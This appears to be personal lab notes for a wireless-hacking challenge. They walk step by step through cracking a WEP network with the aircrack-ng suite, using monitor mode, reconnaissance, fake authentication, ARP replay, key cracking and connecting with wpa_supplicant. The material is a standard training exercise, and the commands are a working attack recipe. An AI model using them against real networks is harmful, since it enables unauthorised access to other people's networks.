# Wep network

Stolen from [wifichallengelab walkthrough](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/#07-get-wifi-old-password) and [aircrack walkthrough](https://www.aircrack-ng.org/doku.php?id=simple_wep_crack)!

## Tools

- [airmon-ng](https://linux.die.net/man/1/airmon-ng)
- [airodump-ng](https://linux.die.net/man/1/airodump-ng)
- [aireplay-ng](https://linux.die.net/man/1/aireplay-ng)
- [aircrack-ng](https://linux.die.net/man/1/aircrack-ng)
- [wpa_supplicant](https://linux.die.net/man/8/wpa_supplicant)

## Reconnaissance

1. Set the `wlan0` interface into monitor mode

```bash
sudo airmon-ng start wlan0
```

> Note: Do not run `airmon-ng check kill` as it will kill important processes required to run was

2. Conduct reconnaissance using the `wlan0mon` interface to find the target wep network

```bash
sudo airodump-ng wlan0mon --band abg --wps --manufacturer
```

Here is a breakdown of the above command
```bash
sudo               # Run the command as `root`
  airodump-ng      # The program we want to run
    wlan0mon       # The wireless interface
    --band abg     # Hop to channels in the a, b, and g frequency bands
    --wps          # List Wireless Protected Setup (WPS) information
    --manufacturer # Display the manufacturer of devices (based on their OUI)
```

3. Capture wep traffic with airodump

```bash
sudo airodump-ng wlan0mon -c 1 -w /tmp/wep
```

4. Run fakeauth attack with airodump-ng

```bash
sudo aireplay-ng -1 3600 -q 10 -a 12:3C:86:9A:C4:E0 wlan0mon
```

5. Run arp replay attack to generate arp traffic

```bash
sudo aireplay-ng -3 -b 12:3C:86:9A:C4:E0 -h 02:00:00:00:00:00 wlan0mon
```

6. Crack the wep pcap

```bash
aircrack-ng -b 12:3C:86:9A:C4:E0 /tmp/wep*.cap
```

7. Create a `wpa_supplicant` configuration file based off of the information gathered in step 2

- Edit the configuration file

```
network={
  ssid="was-wep"
  key_mgmt=NONE
  wep_key0=badbeefcaf # chuck the hex key here
  wep_tx_keyidx=0
}
```

8. Connect to the wep network

```bash
sudo wpa_supplicant -i wlan1 -c wep_network.conf
sudo dhclient wlan1
```
